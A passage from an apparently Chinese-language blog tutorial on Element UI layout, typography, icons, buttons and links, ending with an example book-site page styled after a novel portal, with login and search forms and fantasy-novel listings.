class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;8&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;6&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;6&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;6&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;6&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;4&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .el-row &#123;</span><br><span class="line">    margin-bottom: 20px;</span><br><span class="line">    &amp;:last-child &#123;</span><br><span class="line">      margin-bottom: 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  .el-col &#123;</span><br><span class="line">    border-radius: 4px;</span><br><span class="line">  &#125;</span><br><span class="line">  .bg-purple-dark &#123;</span><br><span class="line">    background: #99a9bf;</span><br><span class="line">  &#125;</span><br><span class="line">  .bg-purple &#123;</span><br><span class="line">    background: #d3dce6;</span><br><span class="line">  &#125;</span><br><span class="line">  .bg-purple-light &#123;</span><br><span class="line">    background: #e5e9f2;</span><br><span class="line">  &#125;</span><br><span class="line">  .grid-content &#123;</span><br><span class="line">    border-radius: 4px;</span><br><span class="line">    min-height: 36px;</span><br><span class="line">  &#125;</span><br><span class="line">  .row-bg &#123;</span><br><span class="line">    padding: 10px 0;</span><br><span class="line">    background-color: #f9fafc;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216204027054.png" alt="image-20231216204027054"></p>
+<h4 id="Typography字体"><a href="#Typography字体" class="headerlink" title="Typography字体"></a>Typography字体</h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216204555936.png" alt="image-20231216204555936"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-family: &quot;Helvetica Neue&quot;,Helvetica,&quot;PingFang SC&quot;,&quot;Hiragino Sans GB&quot;,&quot;Microsoft YaHei&quot;,&quot;微软雅黑&quot;,Arial,sans-serif;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216204340999.png" alt="image-20231216204340999"></p>
+<h4 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;i class=&quot;el-icon-edit&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;el-icon-share&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;i class=&quot;el-icon-delete&quot;&gt;&lt;/i&gt;</span><br><span class="line">&lt;el-button type=&quot;primary&quot; icon=&quot;el-icon-search&quot;&gt;搜索&lt;/el-button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216205443499.png" alt="image-20231216205443499"></p>
+<h4 id="按钮-1"><a href="#按钮-1" class="headerlink" title="按钮"></a>按钮</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-button&gt;默认按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot;&gt;主要按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;success&quot;&gt;成功按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;info&quot;&gt;信息按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;warning&quot;&gt;警告按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;danger&quot;&gt;危险按钮&lt;/el-button&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-button plain&gt;朴素按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot; plain&gt;主要按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;success&quot; plain&gt;成功按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;info&quot; plain&gt;信息按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;warning&quot; plain&gt;警告按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;danger&quot; plain&gt;危险按钮&lt;/el-button&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-button round&gt;圆角按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot; round&gt;主要按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;success&quot; round&gt;成功按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;info&quot; round&gt;信息按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;warning&quot; round&gt;警告按钮&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;danger&quot; round&gt;危险按钮&lt;/el-button&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-button icon=&quot;el-icon-search&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;primary&quot; icon=&quot;el-icon-edit&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;success&quot; icon=&quot;el-icon-check&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;info&quot; icon=&quot;el-icon-message&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;warning&quot; icon=&quot;el-icon-star-off&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">  &lt;el-button type=&quot;danger&quot; icon=&quot;el-icon-delete&quot; circle&gt;&lt;/el-button&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216213527192.png" alt="image-20231216213527192"></p>
+<h4 id="文字链接"><a href="#文字链接" class="headerlink" title="文字链接"></a>文字链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;el-link href=&quot;https://element.eleme.io&quot; target=&quot;_blank&quot;&gt;默认链接&lt;/el-link&gt;</span><br><span class="line">  &lt;el-link type=&quot;primary&quot;&gt;主要链接&lt;/el-link&gt;</span><br><span class="line">  &lt;el-link type=&quot;success&quot;&gt;成功链接&lt;/el-link&gt;</span><br><span class="line">  &lt;el-link type=&quot;warning&quot;&gt;警告链接&lt;/el-link&gt;</span><br><span class="line">  &lt;el-link type=&quot;danger&quot;&gt;危险链接&lt;/el-link&gt;</span><br><span class="line">  &lt;el-link type=&quot;info&quot;&gt;信息链接&lt;/el-link&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231216213641463.png" alt="image-20231216213641463"></p>
+<p>当加入disabied是出于禁用状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-link type=&quot;primary&quot; disabled&gt;主要链接&lt;/el-link&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="列子"><a href="#列子" class="headerlink" title="列子"></a>列子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;图书管理系统&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;24&quot;&gt;&lt;div class=&quot;grid-content bg-purple-dark&quot;&gt;</span><br><span class="line">    &lt;el-row&gt;</span><br><span class="line">    &lt;el-col :span=&quot;5&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">    &lt;el-col :span=&quot;7&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light-zhan&quot;&gt;</span><br><span class="line">        &lt;a href=&quot;&quot;&gt;将本站设为首页&lt;/a&gt;</span><br><span class="line">        &amp;nbsp;|&amp;nbsp;</span><br><span class="line">        &lt;a href=&quot;&quot;&gt;收藏本站&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">    &lt;el-col :span=&quot;7&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;</span><br><span class="line">        &lt;el-col :span=&quot;20&quot;&gt;&lt;div style=&quot;text-align: right&quot;&gt;</span><br><span class="line">        &lt;form action=&quot;dengru.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登入&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">        &lt;form action=&quot;zhuce.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;用户注册&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;        </span><br><span class="line">    &lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">    &lt;el-col :span=&quot;5&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">    &lt;/el-row&gt;</span><br><span class="line">  &lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">&lt;/el-row&gt;</span><br><span class="line">&lt;el-row&gt;</span><br><span class="line">  &lt;el-col :span=&quot;5&quot;&gt;&lt;div class=&quot;grid-content bg-purple&quot;&gt;&lt;/div&gt;&lt;/el-col&gt;</span><br><span class="line">  &lt;el-col :span=&quot;14&quot;&gt;&lt;div class=&quot;grid-content bg-purple-light&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;head&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;wrap&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;biquge&quot;&gt;</span><br><span class="line">            &lt;a href=&quot;/&quot;&gt;笔趣阁&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;search&quot;&gt;</span><br><span class="line">                &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;serch&quot; class=&quot;text&quot; name=&quot;q&quot; placeholder=&quot;请输入要搜索的书&quot; value&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;button type=&quot;submit&quot; value=&quot;搜索&quot;&gt;搜索&lt;/button&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;share&quot;&gt;</span><br><span class="line">        &lt;form action=&quot;./demo/index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;阅读记录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;el-tabs type=&quot;border-card&quot;&gt;</span><br><span class="line">  &lt;el-tab-pane label=&quot;玄幻&quot;&gt;&lt;div&gt;&lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/20334/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/20/20673.jpg&quot; alt=&quot;神武至尊楚枫苏柔&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;善良的蜜蜂&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/20334/&quot;&gt;神武至尊楚枫苏柔&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;论潜力，不算天才，可玄功武技，皆可无师自通。论实力，任凭你有万千至宝，但定不敌我界灵大军。我是谁？天下众生视我为修罗，却......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/4712/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/4/4627.jpg&quot; alt=&quot;万古神帝张若尘黄烟尘&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;飞天鱼&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/4712/&quot;&gt;万古神帝张若尘黄烟尘&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;八百年前，明帝之子张若尘，被他的未婚妻池瑶公主杀死，一代天骄，就此陨落。八百年后，张若尘重新活了过来，却发现曾经杀死他的......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/122802/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/122/122829.jpg&quot; alt=&quot;开局签到荒古圣体修炼境界划分&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;J神&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/122802/&quot;&gt;开局签到荒古圣体修炼境界划分&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;【【“2020玄幻王”主题征文】参赛作品】【不废柴，不舔狗，天骄争霸暴爽无敌流】君逍遥穿越玄幻世界，成为荒古世家神子，拥......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/163358/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/163/163473.jpg&quot; alt=&quot;李七夜的&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;帝霸&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/163358/&quot;&gt;李七夜的&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;千万年前，李七夜栽下一株翠竹。八百万年前，李七夜养了一条鲤鱼。五百万年前，李七夜收养一个小女孩。今天，李七夜一觉醒来，翠......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/28128/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/28/28307.jpg&quot; alt=&quot;龙族之武圣路明非&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;夏天单车和猫&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/28128/&quot;&gt;龙族之武圣路明非&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;穿越到高武世界的路明非，被人看成习武奇才，修成了天下第一后回到龙族世界。他已经不是那个衰仔，曾为天下第一，被武林中人尊称......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;image&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;/book/115005/&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;https://www.bqgbe.com/bookimg/115/115198.jpg&quot; alt=&quot;太古老祖树下睡觉&quot; width=&quot;120&quot; height=&quot;150&quot; border=&quot;0&quot;/&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;dl&gt;</span><br><span class="line">                        &lt;dt&gt;</span><br><span class="line">                            &lt;span&gt;君逍遥君玲珑&lt;/span&gt;</span><br><span class="line">                            &lt;a href=&quot;/book/115005/&quot;&gt;太古老祖树下睡觉&lt;/a&gt;</span><br><span class="line">                        &lt;/dt&gt;</span><br><span class="line">                        &lt;dd&gt;【不废柴，不舔狗，天骄争霸暴爽无敌流】......&lt;/dd&gt;</span><br><span class="line">                    &lt;/dl&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                